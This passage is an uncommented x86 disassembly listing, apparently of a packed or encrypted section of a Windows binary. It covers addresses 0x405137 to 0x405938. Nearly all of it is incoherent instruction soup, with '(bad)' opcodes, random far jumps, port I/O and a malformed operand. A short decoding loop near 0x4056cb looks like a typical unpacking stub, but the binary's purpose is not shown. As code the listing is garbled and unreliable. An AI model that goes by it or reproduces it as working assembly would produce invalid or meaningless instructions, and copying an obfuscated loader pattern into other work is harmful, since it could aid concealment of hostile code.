  405137:	rol    BYTE PTR [edi+0x10b8936],1
  40513d:	cld    
  40513e:	cli    
  40513f:	fld    DWORD PTR [edx-0x3b5eb3bd]
  405145:	xlat   BYTE PTR ds:[ebx]
  405146:	mov    ah,ch
  405148:	jmp    0x594e:0x2cb8343
  40514f:	shl    BYTE PTR gs:[esi],0xfb
  405153:	ficom  DWORD PTR [ebp+edx*1-0x1b]
  405157:	push   dx
  405159:	jge    0x405165
  40515b:	int3   
  40515c:	xor    BYTE PTR [ebp-0x4132e06],cl
  405162:	xor    bh,ah
  405164:	ror    dh,0xa6
  405167:	mov    BYTE PTR [edx-0x47],ah
  40516a:	add    eax,0x8c797788
  40516f:	(bad)  
  405170:	pushf  
  405171:	xchg   BYTE PTR [edx+0x54],bl
  405174:	mov    eax,ds:0x7b774293
  405179:	adc    DWORD PTR [ebp+esi*1-0x13],ecx
  40517d:	xor    BYTE PTR [esi],dl
  40517f:	and    BYTE PTR [ebx],ch
  405181:	pop    es
  405182:	add    eax,0x8361b4d1
  405187:	mov    dl,0xd9
  405189:	pushf  
  40518a:	loop   0x4051ca
  40518c:	inc    ebx
  40518d:	lods   eax,DWORD PTR ds:[esi]
  40518e:	in     al,dx
  40518f:	jbe    0x4051f3
  405191:	sbb    ebx,DWORD PTR [ecx]
  405193:	nop
  405194:	int    0x7f
  405196:	jno    0x40513d
  405198:	dec    esi
  405199:	xlat   BYTE PTR ds:[ebx]
  40519a:	sbb    eax,0x67f0e77f
  40519f:	sbb    bl,ah
  4051a1:	into   
  4051a2:	rol    DWORD PTR [esi-0x40],cl
  4051a5:	popf   
  4051a6:	pop    ds
  4051a7:	je     0x4051d3
  4051a9:	or     eax,0xdedac424
  4051ae:	(bad)  
  4051af:	jg     0x4051c2
  4051b1:	fisttp QWORD PTR [edi-0x7f]
  4051b4:	scas   al,BYTE PTR es:[edi]
  4051b5:	ret    0xc2ac
  4051b8:	pop    ebp
  4051b9:	sbb    DWORD PTR [edx],ebx
  4051bb:	adc    eax,0xd554dc20
  4051c0:	in     eax,0x1
  4051c2:	add    DWORD PTR [ebx-0x39],edi
  4051c5:	inc    esp
  4051c6:	ret    0xd8
  4051c9:	and    cl,BYTE PTR [ecx-0x14f6818c]
  4051cf:	aad    0xbd
  4051d1:	sbb    al,0x92
  4051d3:	jb     0x4051ff
  4051d5:	cmp    dl,BYTE PTR [ecx+eax*4-0x3b]
  4051d9:	js     0x4051ac
  4051db:	sub    DWORD PTR [esi-0x2501d98f],edi
  4051e1:	popa   
  4051e2:	in     al,dx
  4051e3:	mov    eax,ds:0x399523c1
  4051e8:	(bad)  
  4051e9:	loope  0x4051f6
  4051eb:	popa   
  4051ec:	lods   eax,DWORD PTR ds:[esi]
  4051ed:	ja     0x4051a4
  4051ef:	dec    ebp
  4051f0:	push   eax
  4051f1:	pop    ebp
  4051f2:	leave  
  4051f3:	jbe    0x4051ad
  4051f5:	ins    BYTE PTR es:[edi],dx
  4051f6:	push   ds
  4051f7:	in     al,dx
  4051f8:	clc    
  4051f9:	loope  0x405227
  4051fb:	mov    eax,0x4bf74b61
  405200:	je     0x4051b7
  405202:	imul   esi,DWORD PTR [eax+ecx*1],0x3aa72a2f
  405209:	and    ecx,ebx
  40520b:	imul   ebx,DWORD PTR [ebx+0x1bba9229],0xde17b663
  405215:	lds    edi,FWORD PTR [ebx]
  405217:	sbb    al,0x48
  405219:	xchg   ebp,eax
  40521a:	pop    ds
  40521b:	push   es
  40521c:	int    0xc5
  40521e:	cmp    ebp,DWORD PTR [eax]
  405220:	repnz push ebp
  405222:	xchg   DWORD PTR [eax-0x80],ebx
  405225:	jmp    0x76b6:0x3bf25990
  40522c:	mov    edx,0x1ee36fd4
  405231:	fcomp  DWORD PTR [ebx+0x2f3ee7ce]
  405237:	add    al,0x2f
  405239:	into   
  40523a:	mov    eax,DWORD PTR [edi]
  40523c:	pusha  
  40523d:	jb     0x40522b
  40523f:	test   eax,0x86c7066d
  405244:	xchg   ebp,eax
  405245:	or     BYTE PTR [edi*4+0x170dba3b],bl
  40524c:	ret    0xc35
  40524f:	stos   BYTE PTR es:[edi],al
  405250:	mov    al,ds:0x84e03254
  405255:	jne    0x405220
  405257:	jbe    0x4052ad
  405259:	sub    edx,DWORD PTR [ecx]
  40525b:	mov    WORD PTR [edx+0x64],ss
  40525e:	(bad)  
  40525f:	repz adc ebx,ebx
  405262:	mov    ebx,esp
  405264:	iret   
  405265:	fwait
  405266:	fwait
  405267:	repnz scas al,BYTE PTR es:[edi]
  405269:	repnz adc al,0x75
  40526c:	mov    eax,ds:0xa99b9c65
  405271:	nop
  405272:	loope  0x405235
  405274:	sbb    cl,ch
  405276:	std    
  405277:	lock fsub st(5),st
  40527a:	push   ds
  40527b:	scas   al,BYTE PTR es:[edi]
  40527c:	pop    ss
  40527d:	xor    eax,0xce1355db
  405282:	xchg   DWORD PTR [edx],eax
  405284:	xchg   edi,eax
  405285:	xor    ch,BYTE PTR [ebp+0x663952e5]
  40528b:	std    
  40528c:	test   ch,ah
  40528e:	adc    dh,0xf9
  405291:	popa   
  405292:	mov    cl,0x99
  405294:	push   ds
  405295:	scas   eax,DWORD PTR es:[edi]
  405296:	inc    edx
  405297:	fisttp DWORD PTR [esi-0x1ba9298a]
  40529d:	jns    0x405255
  40529f:	xchg   edx,eax
  4052a0:	cmp    eax,0x64060ec6
  4052a5:	ror    DWORD PTR [eax],1
  4052a7:	mov    ebp,0xf1bb2c26
  4052ac:	dec    ecx
  4052ad:	fimul  DWORD PTR [ebx]
  4052af:	and    eax,0x1f831b88
  4052b4:	test   al,0x16
  4052b6:	js     0x40524b
  4052b8:	(bad)  
  4052b9:	cwde   
  4052ba:	sub    BYTE PTR [edx-0x31],0x4c
  4052be:	imul   BYTE PTR [edx-0x5e]
  4052c1:	call   0xc8b9:0xc3e26f8b
  4052c8:	les    esp,FWORD PTR [ebx]
  4052ca:	xchg   ecx,eax
  4052cb:	sbb    eax,0x1a0d0479
  4052d0:	mov    bh,0x0
  4052d2:	pop    ebp
  4052d3:	in     eax,dx
  4052d4:	scas   eax,DWORD PTR es:[edi]
  4052d5:	and    BYTE PTR [edi-0x37271027],al
  4052db:	mov    ebx,0x808f3ca2
  4052e0:	popa   
  4052e1:	cmc    
  4052e2:	std    
  4052e3:	add    eax,0x4b940a3d
  4052e8:	lock (bad) 
  4052ea:	out    dx,eax
  4052eb:	and    esi,DWORD PTR ds:0xa1822e2e
  4052f1:	std    
  4052f2:	mov    BYTE PTR [ebx+edi*1+0x3f],0x99
  4052f7:	cld    
  4052f8:	das    
  4052f9:	in     eax,0x30
  4052fb:	sbb    edi,DWORD PTR [ecx]
  4052fd:	xchg   ecx,eax
  4052fe:	xchg   ebp,eax
  4052ff:	adc    al,dh
  405301:	add    DWORD PTR [eax+0x79],eax
  405304:	pop    edx
  405305:	pusha  
  405306:	sub    al,0x2
  405308:	inc    edi
  405309:	push   es
  40530a:	(bad)  
  40530c:	in     al,0x2e
  40530e:	inc    ebx
  40530f:	pop    edi
  405310:	rol    BYTE PTR [esi],cl
  405312:	cmp    DWORD PTR [edx+0x9],esi
  405315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405316:	add    esp,DWORD PTR [esi+0x2ded57d8]
  40531c:	xor    esp,DWORD PTR [edi-0x47]
  40531f:	mov    ds:0x7397797f,eax
  405324:	arpl   WORD PTR [eax-0x4059f14c],ax
  40532a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40532b:	stos   BYTE PTR es:[edi],al
  40532c:	in     eax,0xce
  40532e:	mov    BYTE PTR [ebp+0x1e99244],bh
  405334:	jecxz  0x405383
  405336:	ret    
  405337:	adc    eax,0x5951479a
  40533c:	jmp    0xae41c1ca
  405341:	or     eax,0xae3b172e
  405346:	add    eax,0xaa5392c2
  40534b:	mov    DWORD PTR [esi-0x6fda88ab],ebp
  405351:	adc    al,0x5e
  405353:	xor    DWORD PTR [ecx+0x3b],0xdad6d9b1
  40535a:	fist   WORD PTR [esi+0x2b715a60]
  405360:	addr16 mov edi,0xae568c2c
  405366:	pop    esp
  405367:	mov    esp,0x2cb872c4
  40536c:	inc    edx
  40536d:	mov    dl,0x91
  40536f:	test   DWORD PTR [ebx+0x36],edi
  405372:	sbb    al,cl
  405374:	and    DWORD PTR [esi],ebx
  405376:	mov    al,0x85
  405378:	in     al,dx
  405379:	adc    DWORD PTR [esi+0x2b],ebp
  40537c:	data16 aad 0x90
  40537f:	out    dx,eax
  405380:	into   
  405381:	inc    edx
  405382:	mov    al,ds:0x4ef7fdea
  405387:	in     al,0xe6
  405389:	test   BYTE PTR [eax],al
  40538b:	jg     0x405371
  40538d:	aas    
  40538e:	rol    BYTE PTR [esi+0x1c],0x69
  405392:	scas   al,BYTE PTR es:[edi]
  405393:	inc    eax
  405394:	mov    dl,0x79
  405396:	adc    DWORD PTR [eax-0xc659f61],ebx
  40539c:	add    DWORD PTR ds:0x7e34dcec,edi
  4053a2:	jo     0x4053c2
  4053a4:	arpl   WORD PTR [esp+edx*2-0x1],bx
  4053a8:	retf   
  4053a9:	jmp    0x8914971f
  4053ae:	mov    BYTE PTR cs:[ebx-0x46],al
  4053b2:	loopne 0x405352
  4053b4:	(bad)  [eax-0xf]
  4053b7:	sahf   
  4053b8:	or     edx,DWORD PTR [edi-0x479e1852]
  4053be:	div    DWORD PTR [ecx-0x6d91234c]
  4053c4:	test   al,0x9d
  4053c6:	lea    ebp,[ecx]
  4053c8:	add    BYTE PTR [eax-0x78],ah
  4053cb:	sbb    bl,BYTE PTR gs:[ebx+0x4d727f1c]
  4053d2:	jp     0x4053cf
  4053d4:	lods   al,BYTE PTR ds:[esi]
  4053d5:	adc    al,0xd2
  4053d7:	sub    DWORD PTR [ebx-0x141607bb],ecx
  4053dd:	add    al,BYTE PTR [eax]
  4053df:	add    ch,cl
  4053e1:	rcl    edx,cl
  4053e3:	(bad)  
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fdiv   st(3),st
  4053ed:	jbe    0x40542d
  4053ef:	add    BYTE PTR ds:0x4d787835,bh
  4053f5:	jle    0x40546f
  4053f7:	js     0x40544b
  4053f9:	mov    cl,0xc4
  4053fb:	jns    0x405463
  4053fd:	xchg   esi,eax
  4053fe:	inc    eax
  4053ff:	and    ch,dl
  405401:	jmp    0x4053f4
  405403:	dec    esp
  405404:	mov    ds:0xeca5389e,eax
  405409:	(bad)  
  40540a:	jle    0x405400
  40540c:	hlt    
  40540d:	sub    BYTE PTR [ebx+0x79],bl
  405410:	mov    BYTE PTR [ecx],bl
  405412:	mov    ecx,?
  405414:	push   ecx
  405415:	sbb    dl,BYTE PTR [esi-0x2248c862]
  40541b:	and    DWORD PTR [eax-0x4],eax
  40541e:	(bad)  
  40541f:	repnz es push ecx
  405422:	sbb    eax,DWORD PTR [esi+0xcacefbd]
  405428:	int    0xc7
  40542a:	stos   DWORD PTR es:[edi],eax
  40542b:	sub    al,0xa5
  40542d:	lock icebp 
  40542f:	test   eax,0x87c7ffc0
  405434:	inc    esp
  405435:	stos   BYTE PTR es:[edi],al
  405436:	outs   dx,DWORD PTR ds:[esi]
  405437:	push   esp
  405438:	xor    eax,0x86af9eb
  40543d:	lahf   
  40543e:	mov    ecx,DWORD PTR [ecx]
  405440:	outs   dx,DWORD PTR ds:[esi]
  405441:	dec    edx
  405442:	ror    DWORD PTR [ecx-0x50],cl
  405445:	das    
  405446:	mov    ah,0x66
  405448:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544a:	mov    al,0x2e
  40544c:	lods   eax,DWORD PTR ds:[esi]
  40544d:	test   DWORD PTR [esi],eax
  40544f:	mov    ecx,0x8ec354d6
  405454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405455:	enter  0x5d83,0x7a
  405459:	ficom  WORD PTR [ebp-0xa1bebc7]
  40545f:	sti    
  405460:	js     0x40545b
  405462:	mov    al,ds:0x4052345
  405467:	gs cmp dh,0xe0
  40546b:	in     al,0x8d
  40546d:	fisubr WORD PTR [ebx+0x55]
  405470:	jb     0x40540c
  405472:	or     cl,BYTE PTR [eax+0x34236c06]
  405478:	ins    BYTE PTR es:[edi],dx
  405479:	xor    dl,dh
  40547b:	jmp    0x5fdf:0xa55e3436
  405482:	lods   al,BYTE PTR ds:[esi]
  405483:	rcr    BYTE PTR [edi-0x1f7c961a],1
  405489:	test   eax,0x3eb4efc5
  40548e:	gs sti 
  405490:	pusha  
  405491:	adc    DWORD PTR [esi+edx*4],edi
  405494:	inc    edx
  405495:	rol    ecx,0x5e
  405498:	cmp    BYTE PTR [ecx*4+0x21d842b4],bl
  40549f:	jg     0x4054ce
  4054a1:	pop    esp
  4054a2:	enter  0xd511,0x96
  4054a6:	clc    
  4054a7:	push   es
  4054a8:	repnz out 0x80,al
  4054ab:	adc    DWORD PTR [edx-0x68],esp
  4054ae:	std    
  4054af:	loope  0x4054d4
  4054b1:	add    eax,0x91b745d1
  4054b6:	arpl   WORD PTR [edi-0x52],cx
  4054b9:	pop    eax
  4054ba:	pop    ebx
  4054bb:	fst    DWORD PTR [edx-0x24]
  4054be:	js     0x51d7b12
  4054c4:	push   esp
  4054c5:	mov    bh,0xff
  4054c7:	lds    ebp,FWORD PTR ds:0xc6c4fcee
  4054cd:	in     eax,dx
  4054ce:	mov    DWORD PTR [esp],esp
  4054d1:	cdq    
  4054d2:	pop    ds
  4054d3:	stos   DWORD PTR es:[edi],eax
  4054d4:	or     BYTE PTR [edi*1+0x6b97a621],al
  4054db:	adc    eax,0xaabefcc1
  4054e0:	mov    al,0x17
  4054e2:	mov    bh,0x28
  4054e4:	out    dx,al
  4054e5:	cmp    BYTE PTR [ebp-0x36],ch
  4054e8:	cmp    al,0xab
  4054ea:	mov    BYTE PTR [edi],0xd0
  4054ed:	sbb    DWORD PTR [edi+0x3],ebx
  4054f0:	push   edx
  4054f1:	ret    
  4054f2:	or     eax,0x636acfb8
  4054f7:	inc    esi
  4054f8:	fld    TBYTE PTR [ebx+0x2d]
  4054fb:	jge    0x40553c
  4054fd:	icebp  
  4054fe:	adc    ecx,DWORD PTR [edx]
  405500:	inc    edx
  405501:	jns    0x40549e
  405503:	popa   
  405504:	sub    eax,0x5c83cfb1
  405509:	loop   0x405522
  40550b:	push   es
  40550c:	sti    
  40550d:	popf   
  40550e:	out    dx,eax
  40550f:	xchg   edx,eax
  405510:	mov    edx,0xf3c52ef6
  405515:	push   edx
  405516:	repz sub ebp,esp
  405519:	mov    ebx,0x7cf3ba67
  40551e:	dec    edx
  40551f:	mov    eax,0xb0eb011f
  405524:	xchg   edi,eax
  405525:	imul   edi,DWORD PTR [ebp-0x3c51dda8],0x33422bcd
  40552f:	sahf   
  405530:	jnp    0x4054b6
  405532:	das    
  405533:	push   esi
  405534:	les    esp,FWORD PTR [ebx]
  405536:	mov    ch,BYTE PTR [ecx+0x77d2f7e2]
  40553c:	pop    ds
  40553d:	xor    BYTE PTR [ecx],cl
  40553f:	mov    dl,0x94
  405541:	mov    edi,0xb265e1f6
  405546:	gs xor edx,eax
  405549:	xlat   BYTE PTR ds:[ebx]
  40554a:	lods   eax,DWORD PTR ds:[esi]
  40554b:	push   es
  40554c:	cmc    
  40554d:	mov    BYTE PTR [ebp+ecx*4+0x36],cl
  405551:	cmp    eax,0x3fe55fce
  405556:	aaa    
  405557:	cmp    edx,edx
  405559:	loope  0x405556
  40555b:	mov    al,0x51
  40555d:	mov    DWORD PTR [ecx-0x5b],eax
  405560:	push   0xbe39f385
  405565:	jo     0x405575
  405567:	fs push esi
  405569:	and    BYTE PTR [ebx+0x0],bh
  40556c:	call   0x673ff457
  405571:	fstp   TBYTE PTR [eax+0x1207f2f4]
  405577:	test   ebp,esi
  405579:	adc    ebp,DWORD PTR [edx+ebx*4+0x48c1f5ca]
  405580:	sub    ah,dl
  405582:	mov    esp,0x1ce312c7
  405587:	es dec ebp
  405589:	loop   0x405589
  40558b:	dec    edi
  40558c:	clc    
  40558d:	lods   al,BYTE PTR ds:[esi]
  40558e:	pop    edx
  40558f:	inc    ecx
  405590:	(bad)  
  405591:	stos   DWORD PTR es:[edi],eax
  405592:	test   eax,0x15d84e10
  405597:	hlt    
  405598:	push   0xffffff8d
  40559a:	lods   al,BYTE PTR ds:[esi]
  40559b:	aas    
  40559c:	xchg   ecx,eax
  40559d:	shl    DWORD PTR [edi+0x39],0xe1
  4055a1:	sub    al,0x4d
  4055a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055a4:	cmp    ebp,DWORD PTR [eax-0x77]
  4055a7:	xor    al,BYTE PTR [edx-0x78426830]
  4055ad:	je     0x4055c2
  4055af:	dec    eax
  4055b0:	test   eax,0xd588a7e3
  4055b5:	mov    esi,0x8e1a24ae
  4055ba:	dec    edx
  4055bb:	or     ecx,ebp
  4055bd:	mov    ebx,0xd8bd5c0f
  4055c2:	arpl   bp,bp
  4055c4:	stos   DWORD PTR es:[edi],eax
  4055c5:	and    eax,ebp
  4055c7:	jbe    0x405555
  4055c9:	call   0x1d3586d6
  4055ce:	cmp    DWORD PTR [esi],eax
  4055d0:	das    
  4055d1:	or     BYTE PTR [edi+0x390b55c1],cl
  4055d7:	ret    0x7437
  4055da:	xor    eax,0x2d5d0108
  4055df:	pop    es
  4055e0:	lods   al,BYTE PTR ds:[esi]
  4055e1:	sub    BYTE PTR [ecx+0x68],cl
  4055e4:	sbb    edx,edx
  4055e6:	out    0xcf,eax
  4055e8:	jp     0x405636
  4055ea:	sub    DWORD PTR [edi-0x67070f1b],edx
  4055f0:	hlt    
  4055f1:	mov    DWORD PTR [esi+edi*8],edx
  4055f4:	sub    ecx,DWORD PTR [ebp-0x68]
  4055f7:	call   eax
  4055f9:	retf   
  4055fa:	neg    DWORD PTR [edx-0x268080aa]
  405600:	in     al,dx
  405601:	movq   mm4,QWORD PTR ds:0xd5094c13
  405608:	pop    esi
  405609:	aaa    
  40560a:	cwde   
  40560b:	and    eax,DWORD PTR [eiz*8-0x7cf7e612]
  405612:	aad    0xdd
  405614:	shr    al,0x8b
  405617:	xor    eax,0x27b5cc35
  40561c:	push   ecx
  40561d:	out    0xbb,al
  40561f:	(bad)  
  405620:	fdiv   QWORD PTR [eax+ebx*4]
  405623:	pop    edx
  405624:	mov    ds:0x7d3e8c72,al
  405629:	jp     0x4055fc
  40562b:	(bad)  
  40562d:	mov    ds:0x6759573f,al
  405632:	rol    DWORD PTR [eax],0x90
  405635:	sub    dl,ch
  405637:	push   ecx
  405638:	push   edi
  405639:	push   ebp
  40563a:	pop    ecx
  40563b:	pusha  
  40563c:	call   0x6d74:0xae3e73fb
  405643:	rcl    bh,1
  405645:	jbe    0x4056c3
  405647:	fcomp  QWORD PTR [ecx+0x9f15249]
  40564d:	mov    ch,0xdb
  40564f:	test   eax,0x22485e8a
  405654:	loop   0x40569d
  405656:	call   FWORD PTR [esi]
  405658:	ins    BYTE PTR es:[edi],dx
  405659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40565a:	and    DWORD PTR [edi],ebp
  40565c:	or     ebp,DWORD PTR [esi+0x3a0d92fe]
  405662:	test   cl,bl
  405664:	mov    ds:0x4e6bfeae,eax
  405669:	fist   DWORD PTR [esp+esi*2-0x6b]
  40566d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566e:	dec    esi
  40566f:	sub    ah,BYTE PTR [esi+0x5153ced7]
  405675:	mov    eax,ds:0xe37d6b86
  40567a:	or     ebx,DWORD PTR [edx+0x19fa40d3]
  405680:	ficomp DWORD PTR [edx+0x75478a01]
  405686:	dec    ebp
  405687:	out    0xc1,eax
  405689:	lds    edi,FWORD PTR [ecx]
  40568b:	sub    ecx,eax
  40568d:	pushf  
  40568e:	(bad)  
  405690:	fsub   st(5),st
  405692:	aaa    
  405693:	mov    dl,0x7f
  405695:	mov    BYTE PTR [edx+ecx*1-0x5f71eb58],bh
  40569c:	mov    al,0x6e
  40569e:	push   eax
  40569f:	outs   dx,DWORD PTR ds:[esi]
  4056a0:	arpl   WORD PTR [ebx+0x1fcdb2b6],cx
  4056a6:	inc    esp
  4056a7:	mov    ecx,0xbfc4be59
  4056ac:	sub    ebp,DWORD PTR [edx]
  4056ae:	sbb    al,0xf2
  4056b0:	jg     0x40566a
  4056b2:	call   0x2dbc:0x47537395
  4056b9:	jp     0x4056b9
  4056bb:	jl     0x405646
  4056bd:	mov    ds:0x824a7ff5,eax
  4056c2:	xlat   BYTE PTR ds:[ebx]
  4056c3:	or     DWORD PTR [esi],esi
  4056c5:	hlt    
  4056c6:	retf   
  4056c7:	iret   
  4056c8:	xchg   ecx,eax
  4056c9:	es inc ecx
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	push   ds
  405713:	imul   ebx,DWORD PTR [edi+0x783a1231],0x78
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056be
  40571f:	lahf   
  405720:	sbb    eax,0xaecdf31d
  405725:	mov    cl,dh
  405727:	inc    edx
  405728:	div    BYTE PTR [ebp-0x6faaa6fa]
  40572e:	gs inc edi
  405730:	mov    BYTE PTR [edi+ebp*1-0x59e650c5],bl
  405737:	test   ax,0x9f9a
  40573b:	mov    ds:0xe7d1c562,eax
  405740:	sub    BYTE PTR [edi],al
  405742:	mov    edi,0x73a17e9c
  405747:	ret    0x98a0
  40574a:	(bad)  
  40574b:	cmovne esp,edx
  40574e:	idiv   BYTE PTR [edx+0x6]
  405751:	dec    ebx
  405752:	mov    ecx,0x604fa0f4
  405757:	dec    esi
  405758:	sub    esp,DWORD PTR [eax-0x3f]
  40575b:	stc    
  40575c:	mov    ch,0xa
  40575e:	fsubr  DWORD PTR [esp+ecx*4-0x16]
  405762:	jp     0x405746
  405764:	push   ebx
  405765:	cld    
  405766:	das    
  405767:	inc    edx
  405768:	inc    ebp
  405769:	cmp    BYTE PTR [ebx-0x5ec81402],ch
  40576f:	xchg   ebp,eax
  405770:	push   es
  405771:	pusha  
  405772:	jl     0x405761
  405774:	mov    eax,ds:0x83f7b59c
  405779:	das    
  40577a:	sar    DWORD PTR ds:0xf876dee0,0xb8
  405781:	jge    0x4057f6
  405783:	outs   dx,BYTE PTR ds:[esi]
  405784:	jmp    0x4057aa
  405786:	or     ecx,DWORD PTR ds:0x28add419
  40578c:	sub    eax,0x81c12f4
  405791:	or     esp,DWORD PTR [eax+0x32]
  405794:	in     al,dx
  405795:	(bad)  
  405796:	in     al,dx
  405797:	adc    bl,ch
  405799:	xor    eax,0xffffffc1
  40579c:	mov    DWORD PTR [eax-0x1eb02bce],ebp
  4057a2:	jp     0x4057e0
  4057a4:	popa   
  4057a5:	rol    ah,1
  4057a7:	lods   al,BYTE PTR ds:[esi]
  4057a8:	jge    0x4057bb
  4057aa:	adc    ah,BYTE PTR [edi]
  4057ac:	add    ah,BYTE PTR [eax-0x10d9d7b6]
  4057b2:	sbb    al,0xd
  4057b4:	xor    eax,0x57ce00ee
  4057b9:	inc    eax
  4057ba:	or     ah,BYTE PTR [ebp+0x1d]
  4057bd:	push   edx
  4057be:	ret    
  4057bf:	ins    BYTE PTR es:[edi],dx
  4057c0:	mov    eax,DWORD PTR [eax+0x7f]
  4057c3:	add    eax,0xa26ac4df
  4057c8:	dec    edi
  4057c9:	mov    ds:0x22f24219,al
  4057ce:	shl    DWORD PTR [esi+0x21],1
  4057d1:	imul   eax,DWORD PTR [esp+eiz*4+0x7a],0xd
  4057d6:	pop    es
  4057d7:	pop    edx
  4057d8:	out    dx,al
  4057d9:	adc    al,0x5c
  4057db:	pusha  
  4057dc:	mov    esp,0x79c01951
  4057e1:	jle    0x40581a
  4057e3:	es mov ebp,0x3fb39a64
  4057e9:	xor    al,0x51
  4057eb:	adc    al,0x82
  4057ed:	sbb    al,BYTE PTR [esi+ecx*2-0x69]
  4057f1:	das    
  4057f2:	mov    ecx,0x8342eed0
  4057f7:	data16 mov ch,0x9c
  4057fa:	add    DWORD PTR [edx+0x5c],ebp
  4057fd:	scas   eax,DWORD PTR es:[edi]
  4057fe:	xchg   DWORD PTR [eax-0x5a],ebx
  405801:	fild   WORD PTR [edi+0x1c]
  405804:	xor    al,0x98
  405806:	sbb    eax,0xe7c1e838
  40580b:	dec    esi
  40580c:	jg     0x4057e3
  40580e:	jg     0x4057fd
  405810:	xchg   ebx,eax
  405811:	pop    ebx
  405812:	and    DWORD PTR [ebx+0x26],0xffffffe8
  405816:	(bad)  
  405817:	out    0x61,al
  405819:	ins    BYTE PTR es:[edi],dx
  40581a:	cmp    al,0xbf
  40581c:	xlat   BYTE PTR ds:[ebx]
  40581d:	mov    bl,0xc8
  40581f:	jne    0x405870
  405821:	pop    ecx
  405822:	ja     0x405895
  405824:	imul   edx,edx,0xce46416e
  40582a:	jge    0x40589c
  40582c:	imul   edx,DWORD PTR [eax-0x39],0xd304439f
  405833:	leave  
  405834:	aam    0xb8
  405836:	cld    
  405837:	test   DWORD PTR [eax+0x7b],0xed8cbaf
  40583e:	jmp    0x9621d9c8
  405843:	mov    al,ds:0x357fb2ae
  405848:	stos   BYTE PTR es:[edi],al
  405849:	popa   
  40584a:	(bad)  
  40584b:	mov    eax,ds:0x71c5057e
  405850:	xor    dl,BYTE PTR [eax]
  405852:	div    dh
  405854:	stos   BYTE PTR es:[edi],al
  405855:	pop    esp
  405856:	mov    edx,0x743bf663
  40585b:	mul    DWORD PTR [eax]
  40585d:	add    DWORD PTR [ecx-0x32],esi
  405860:	dec    esi
  405861:	fisubr DWORD PTR [eax+esi*4+0x1d]
  405865:	std    
  405866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405867:	jl     0x405818
  405869:	loopne 0x4057ff
  40586b:	adc    al,0xff
  40586d:	outs   dx,DWORD PTR ds:[esi]
  40586e:	mov    ecx,0xb29f6f18
  405873:	ja     0x405895
  405875:	repz lds eax,FWORD PTR ds:0xfde94df0
  40587c:	xchg   ebp,eax
  40587d:	or     bh,BYTE PTR [edx]
  40587f:	imul   ecx,esi,0xffffffb5
  405882:	cmp    BYTE PTR [esi],0x6b
  405885:	into   
  405886:	int    0x6c
  405888:	cmp    al,0x1b
  40588a:	(bad)  
  40588b:	ja     0x40581b
  40588d:	sub    eax,0xd46517c3
  405892:	push   cs
  405893:	mov    edx,gs
  405895:	fs jb  0x405819
  405898:	mov    ecx,0x6701f702
  40589d:	adc    ch,BYTE PTR [edi+ebp*1]
  4058a0:	jno    0x4058a3
  4058a2:	xor    esi,eax
  4058a4:	jns    0x4058a6
  4058a6:	out    0xf9,eax
  4058a8:	xor    eax,DWORD PTR [edx]
  4058aa:	xchg   BYTE PTR [edi],ch
  4058ac:	retf   
  4058ad:	adc    ah,ah
  4058af:	jecxz  0x4058d6
  4058b1:	or     eax,0x8ac14dd8
  4058b6:	mov    cs,WORD PTR [eax]
  4058b8:	daa    
  4058b9:	(bad)  
  4058bb:	jle    0x40584c
  4058bd:	and    al,0x72
  4058bf:	repnz test eax,0x4732f3eb
  4058c5:	add    BYTE PTR [ecx],ah
  4058c7:	shr    ecx,0xf9
  4058ca:	mov    esp,0xfbcec5e2
  4058cf:	sub    eax,0x20d97801
  4058d4:	out    dx,al
  4058d5:	icebp  
  4058d6:	cdq    
  4058d7:	icebp  
  4058d8:	add    BYTE PTR ds:0x5a2afe93,0x11
  4058df:	mov    cl,0x24
  4058e1:	aam    0x9b
  4058e3:	xchg   ebx,eax
  4058e4:	mov    edx,DWORD PTR [edx]
  4058e6:	cmc    
  4058e7:	mov    cl,al
  4058e9:	les    esp,FWORD PTR [eax*8-0x6b042a00]
  4058f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f1:	mov    al,ds:0x9480d4d5
  4058f6:	dec    eax
  4058f7:	popa   
  4058f8:	mov    es,WORD PTR [eax-0x145deeff]
  4058fe:	and    al,0x50
  405900:	inc    DWORD PTR [eax+0x2bb3fdb6]
  405906:	jbe    0x4058a5
  405908:	dec    edi
  405909:	fadd   DWORD PTR [ecx+ebx*2]
  40590c:	pusha  
  40590d:	xor    BYTE PTR [esi-0x6fe7fe2d],0xe1
  405914:	pop    ebp
  405915:	mov    ds:0x96d42ff4,eax
  40591a:	mov    edi,0x87995e5a
  40591f:	jno    0x4058aa
  405921:	imul   ecx,DWORD PTR [esp+edx*4+0x40b5c42b],0x73
  405929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40592a:	mov    eax,0x1628b15c
  40592f:	sub    ecx,ebx
  405931:	lods   eax,DWORD PTR ds:[esi]
  405932:	or     DWORD PTR [esi+0x5f],ebx
  405935:	rcl    DWORD PTR gs:[ecx],cl
  405938:	cmp    DWORD PTR [edx+0x7709fdab],0x3a
